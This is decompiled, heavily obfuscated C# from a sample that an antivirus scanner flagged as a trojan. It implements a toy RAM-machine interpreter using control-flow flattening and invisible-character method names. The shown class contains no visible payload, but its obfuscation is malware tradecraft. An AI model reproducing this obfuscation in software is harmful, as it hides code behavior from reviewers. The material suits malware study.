// Decompiled with JetBrains decompiler
// Type: ram_machine.Machine
// Assembly: InternalCrossContextDelega, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D2AB7CD5-4913-4369-B066-3ED6411FFDD0
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan.MSIL.Stosek.gen-a7018ff4aaaaebda06615da54ab7d3dcfe06ffda501254eb9654aa27152629bb.exe

using ram_machine.Instructions;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace ram_machine
{
  internal class Machine
  {
    private int[] tape;
    private List<Instruction> instructions;
    private int current_line;

    public Machine(int size)
    {
label_1:
      int num1 = 78896785;
      int index;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 872193250)) % 11U)
        {
          case 1:
            num1 = (int) num2 * 1368674060 ^ -1257600817;
            continue;
          case 2:
            this.tape = new int[size];
            num1 = (int) num2 * -778674495 ^ -678090906;
            continue;
          case 3:
            index = 0;
            num1 = (int) num2 * -967539099 ^ -437903342;
            continue;
          case 4:
            ++index;
            num1 = (int) num2 * 374003586 ^ -278643397;
            continue;
          case 5:
            int num3;
            num1 = num3 = index >= size ? 1625144022 : (num3 = 490657411);
            continue;
          case 6:
            num1 = (int) num2 * 2013469155 ^ -835043976;
            continue;
          case 7:
            this.tape[index] = 0;
            num1 = 1474885335;
            continue;
          case 8:
            num1 = (int) num2 * -376362316 ^ 459881861;
            continue;
          case 9:
            this.instructions = new List<Instruction>();
            num1 = (int) num2 * -2059946671 ^ -1563937873;
            continue;
          case 10:
            goto label_1;
          default:
            goto label_12;
        }
      }
label_12:
      this.current_line = 0;
    }

    public void addInstruction(Instruction i)
    {
label_1:
      int num1 = 415753551;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 889074640)) % 4U)
        {
          case 0:
            goto label_1;
          case 2:
            num1 = (int) num2 * 1501052478 ^ 825432017;
            continue;
          case 3:
            i.setLine(this.instructions.Count);
            num1 = (int) num2 * -1558064826 ^ 1939771192;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      this.instructions.Add(i);
    }

    public void insertInput(int[] input)
    {
      if (input.Length <= this.tape.Length)
        goto label_6;
label_1:
      int num1 = -1631494076;
label_2:
      int index;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -654825861)) % 10U)
        {
          case 0:
            goto label_1;
          case 1:
            int num3;
            num1 = num3 = index >= input.Length ? -332886620 : (num3 = -1231419953);
            continue;
          case 2:
            goto label_6;
          case 3:
            num1 = (int) num2 * 1948829170 ^ -113850723;
            continue;
          case 4:
            ++index;
            num1 = (int) num2 * 192698661 ^ 1097165518;
            continue;
          case 5:
            num1 = (int) num2 * -1432013480 ^ -941197836;
            continue;
          case 6:
            this.tape[index] = input[index];
            num1 = (int) num2 * -1008589793 ^ -1145915360;
            continue;
          case 7:
            goto label_7;
          case 8:
            num1 = -955072143;
            continue;
          case 9:
            goto label_3;
          default:
            goto label_12;
        }
      }
label_3:
      return;
label_12:
      return;
label_7:
      throw Machine.\u202B⁫‍‪‎‬​⁭‎‪‌⁫‬⁮‫⁮⁮‍⁭‌‏‍‬⁯‮⁪‍​‌‭⁮​‫‎⁯‭⁪‍⁭⁮‮();
label_6:
      index = 0;
      num1 = -579115822;
      goto label_2;
    }

    public int[] getTape()
    {
label_1:
      int num1 = 367133047;
      int[] tape;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 222662023)) % 3U)
        {
          case 1:
            tape = this.tape;
            num1 = (int) num2 * -72441192 ^ -649997623;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return tape;
    }

    public bool runOneInstruction()
    {
      bool flag1 = this.current_line == -1;
label_1:
      int num1 = -1200359233;
      bool flag2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1238438725)) % 7U)
        {
          case 1:
            flag2 = false;
            num1 = (int) num2 * -1437215120 ^ 985757461;
            continue;
          case 2:
            flag2 = true;
            num1 = -1465534866;
            continue;
          case 3:
            goto label_1;
          case 4:
            int num3 = !flag1 ? 2018709725 : (num3 = 1057539336);
            num1 = num3 ^ (int) num2 * -479704571;
            continue;
          case 5:
            num1 = (int) num2 * -1384607605 ^ -1143298750;
            continue;
          case 6:
            num1 = (int) num2 * 310126390 ^ 475931014;
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      return flag2;
    }

    public void runUntilHalt()
    {
label_5:
      bool flag = this.runOneInstruction();
      int num1 = 403562727;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1613007655)) % 5U)
        {
          case 0:
            int num3 = !flag ? 569439203 : (num3 = 233336102);
            num1 = num3 ^ (int) num2 * 1962961586;
            continue;
          case 1:
            num1 = 1305084050;
            continue;
          case 2:
            goto label_3;
          case 3:
            goto label_5;
          case 4:
            num1 = 2122450598;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    public string getInstructionsString()
    {
label_1:
      int num1 = -1642833206;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -43846705)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            str = "";
            num1 = (int) num2 * 1476045484 ^ -1177569294;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      List<Instruction>.Enumerator enumerator = this.instructions.GetEnumerator();
      try
      {
label_9:
        int num3 = !enumerator.MoveNext() ? -1253886779 : (num3 = -1291026114);
        Instruction current;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num3 ^ -43846705)) % 7U)
          {
            case 0:
              str = Machine.\u206F‎‮‍‮‪⁯‪​‬⁫⁮⁪​⁮⁯⁪‮⁭‫⁬⁬‍⁪‬⁭⁪‬‬‬⁮‎‪⁯​‭⁯‫‎‌‮(str, current.ToString(), \u003CModule\u003E.\u206E⁯‍‎‏⁭⁫⁭⁬‪‬‬‏⁮⁮‍⁫‍⁮⁫‫⁭‬‎‮‎⁮⁮‎⁮‪​‌‫​‫‫⁫⁫‬‮<string>(2413327992U));
              num3 = (int) num4 * 1662673245 ^ -463294068;
              continue;
            case 1:
              current = enumerator.Current;
              num3 = -2057661420;
              continue;
            case 2:
              num3 = (int) num4 * -2050829621 ^ -1671362319;
              continue;
            case 3:
              goto label_9;
            case 4:
              num3 = -1291026114;
              continue;
            case 5:
              num3 = (int) num4 * -1580712447 ^ -635037426;
              continue;
            default:
              goto label_18;
          }
        }
      }
      finally
      {
        enumerator.Dispose();
label_14:
        int num5 = -544709460;
        while (true)
        {
          uint num6;
          switch ((num6 = (uint) (num5 ^ -43846705)) % 3U)
          {
            case 0:
              goto label_14;
            case 2:
              num5 = (int) num6 * 2133026337 ^ 2045900236;
              continue;
            default:
              goto label_17;
          }
        }
label_17:;
      }
label_18:
      bool flag = this.instructions.Count == 0;
label_19:
      int num7 = -478356999;
      string instructionsString;
      while (true)
      {
        uint num8;
        switch ((num8 = (uint) (num7 ^ -43846705)) % 7U)
        {
          case 0:
            str = \u003CModule\u003E.\u206E⁯‍‎‏⁭⁫⁭⁬‪‬‬‏⁮⁮‍⁫‍⁮⁫‫⁭‬‎‮‎⁮⁮‎⁮‪​‌‫​‫‫⁫⁫‬‮<string>(2178281954U);
            num7 = (int) num8 * 1331624187 ^ 787392349;
            continue;
          case 1:
            num7 = (int) num8 * -1845780112 ^ 1238956155;
            continue;
          case 3:
            num7 = (int) num8 * 1803736658 ^ -537934631;
            continue;
          case 4:
            int num9 = flag ? -47011668 : (num9 = -5727687);
            num7 = num9 ^ (int) num8 * 1153181987;
            continue;
          case 5:
            goto label_19;
          case 6:
            instructionsString = str;
            num7 = -725612009;
            continue;
          default:
            goto label_26;
        }
      }
label_26:
      return instructionsString;
    }

    public static Machine getSampleMachine()
    {
label_1:
      int num1 = 1321720609;
      List<int> parameters;
      Machine machine;
      Instruction i1;
      int[] input;
      Instruction i2;
      Instruction i3;
      Instruction i4;
      Instruction i5;
      Instruction i6;
      Instruction i7;
      Instruction i8;
      Machine sampleMachine;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1433255607)) % 60U)
        {
          case 0:
            machine.addInstruction(i2);
            num1 = (int) num2 * 248704410 ^ -1995264594;
            continue;
          case 1:
            num1 = (int) num2 * -985742447 ^ -307756415;
            continue;
          case 2:
            i4 = (Instruction) new GotoIfInstruction();
            parameters.Clear();
            num1 = (int) num2 * -301651387 ^ -487790301;
            continue;
          case 3:
            machine.addInstruction(i3);
            num1 = (int) num2 * -798127602 ^ 2095483008;
            continue;
          case 4:
            parameters.Add(0);
            parameters.Add(3);
            num1 = (int) num2 * 1999185097 ^ -1042194440;
            continue;
          case 5:
            parameters.Add(4);
            i2.setParameters(parameters);
            num1 = (int) num2 * -1298107404 ^ 558917855;
            continue;
          case 6:
            parameters.Add(4);
            num1 = (int) num2 * -943234259 ^ -862168716;
            continue;
          case 7:
            parameters.Add(2);
            num1 = (int) num2 * -1995617387 ^ -984169890;
            continue;
          case 8:
            machine.addInstruction(i6);
            num1 = (int) num2 * 110626806 ^ -365387989;
            continue;
          case 9:
            machine.addInstruction(i4);
            num1 = (int) num2 * -1078478918 ^ 1951766282;
            continue;
          case 10:
            num1 = (int) num2 * 1198991072 ^ -1591404856;
            continue;
          case 11:
            i4.setParameters(parameters);
            num1 = (int) num2 * -2145571613 ^ 545369357;
            continue;
          case 12:
            parameters.Add(4);
            num1 = (int) num2 * 852757728 ^ 40816461;
            continue;
          case 13:
            parameters.Add(0);
            num1 = (int) num2 * -1533504220 ^ 2141865266;
            continue;
          case 14:
            num1 = (int) num2 * 298799122 ^ -1390255807;
            continue;
          case 15:
            parameters.Add(3);
            num1 = (int) num2 * -1393563404 ^ 34666060;
            continue;
          case 16:
            num1 = (int) num2 * -556002751 ^ 533772121;
            continue;
          case 17:
            i5.setParameters(parameters);
            num1 = (int) num2 * -1699201366 ^ 1179021646;
            continue;
          case 18:
            i3 = (Instruction) new AddInstruction();
            parameters.Clear();
            num1 = (int) num2 * 215749688 ^ 1436421899;
            continue;
          case 19:
            i8.setParameters(parameters);
            machine.addInstruction(i8);
            num1 = (int) num2 * -1667901159 ^ 2116678093;
            continue;
          case 20:
            i3.setParameters(parameters);
            num1 = (int) num2 * 1558610904 ^ 1275410484;
            continue;
          case 21:
            machine.insertInput(input);
            sampleMachine = machine;
            num1 = (int) num2 * 1957737562 ^ -891191854;
            continue;
          case 22:
            i7 = (Instruction) new HaltInstruction();
            num1 = (int) num2 * -600855364 ^ 1040377830;
            continue;
          case 23:
            num1 = (int) num2 * 207211679 ^ 134196079;
            continue;
          case 24:
            num1 = (int) num2 * -433945222 ^ 621530684;
            continue;
          case 25:
            num1 = (int) num2 * 1909732279 ^ -1147118306;
            continue;
          case 26:
            num1 = (int) num2 * 1049735664 ^ 941313032;
            continue;
          case 27:
            num1 = (int) num2 * -1904355338 ^ 222913716;
            continue;
          case 28:
            num1 = (int) num2 * -1740073641 ^ 104081507;
            continue;
          case 29:
            parameters.Add(1);
            num1 = (int) num2 * -592895038 ^ 459735412;
            continue;
          case 30:
            goto label_1;
          case 31:
            num1 = (int) num2 * -1542501960 ^ -1031254889;
            continue;
          case 32:
            num1 = (int) num2 * 1859277106 ^ -526614071;
            continue;
          case 33:
            parameters.Add(1);
            num1 = (int) num2 * -371560417 ^ 1828420503;
            continue;
          case 34:
            i8 = (Instruction) new SubstractInstruction();
            num1 = (int) num2 * 732353328 ^ 676731359;
            continue;
          case 35:
            i1.setParameters(parameters);
            num1 = (int) num2 * 229212780 ^ 260734867;
            continue;
          case 36:
            parameters.Add(3);
            num1 = (int) num2 * 1220909810 ^ 437616414;
            continue;
          case 37:
            num1 = (int) num2 * -715066849 ^ -1491968058;
            continue;
          case 38:
            i6 = (Instruction) new AddInstruction();
            parameters.Clear();
            num1 = (int) num2 * -1460135895 ^ -1519728042;
            continue;
          case 39:
            parameters.Add(3);
            num1 = (int) num2 * 1166143477 ^ 1983891017;
            continue;
          case 40:
            num1 = (int) num2 * 977901232 ^ -1781594345;
            continue;
          case 41:
            machine.addInstruction(i5);
            num1 = (int) num2 * 655940645 ^ 1957450873;
            continue;
          case 42:
            i2 = (Instruction) new GotoIfInstruction();
            parameters.Clear();
            num1 = (int) num2 * 2142703212 ^ 1757290785;
            continue;
          case 43:
            i1 = (Instruction) new AssignValueInstruction();
            parameters.Clear();
            num1 = (int) num2 * 2123208027 ^ -1019731717;
            continue;
          case 44:
            machine.addInstruction(i1);
            num1 = (int) num2 * -390230547 ^ -891553367;
            continue;
          case 45:
            num1 = (int) num2 * 50554239 ^ -767423463;
            continue;
          case 47:
            num1 = (int) num2 * 1620021094 ^ -378029025;
            continue;
          case 48:
            parameters.Clear();
            parameters.Add(2);
            num1 = (int) num2 * -1920152043 ^ 1109500839;
            continue;
          case 49:
            machine.addInstruction(i7);
            num1 = (int) num2 * -912556655 ^ -1986461018;
            continue;
          case 50:
            parameters.Add(2);
            num1 = (int) num2 * 2011963775 ^ 1478558884;
            continue;
          case 51:
            num1 = (int) num2 * 417826249 ^ -188423842;
            continue;
          case 52:
            parameters.Add(2);
            num1 = (int) num2 * -1747210232 ^ -1940804200;
            continue;
          case 53:
            i6.setParameters(parameters);
            num1 = (int) num2 * -1326322685 ^ -140746044;
            continue;
          case 54:
            parameters.Add(5);
            num1 = (int) num2 * 425524390 ^ -197264845;
            continue;
          case 55:
            input = new int[2]{ 5, 6 };
            num1 = (int) num2 * -644511688 ^ 1602817530;
            continue;
          case 56:
            num1 = (int) num2 * 1120156162 ^ 372942515;
            continue;
          case 57:
            num1 = (int) num2 * -987310166 ^ 905250359;
            continue;
          case 58:
            machine = new Machine(6);
            i5 = (Instruction) new AddInstruction();
            parameters = new List<int>();
            parameters.Add(2);
            num1 = (int) num2 * -1525579576 ^ 1565937683;
            continue;
          case 59:
            parameters.Add(5);
            num1 = (int) num2 * 1070367514 ^ -811055535;
            continue;
          default:
            goto label_61;
        }
      }
label_61:
      return sampleMachine;
    }

    static ArgumentOutOfRangeException \u202B⁫‍‪‎‬​⁭‎‪‌⁫‬⁮‫⁮⁮‍⁭‌‏‍‬⁯‮⁪‍​‌‭⁮​‫‎⁯‭⁪‍⁭⁮‮() => new ArgumentOutOfRangeException();

    static string \u206F‎‮‍‮‪⁯‪​‬⁫⁮⁪​⁮⁯⁪‮⁭‫⁬⁬‍⁪‬⁭⁪‬‬‬⁮‎‪⁯​‭⁯‫‎‌‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }
  }
}
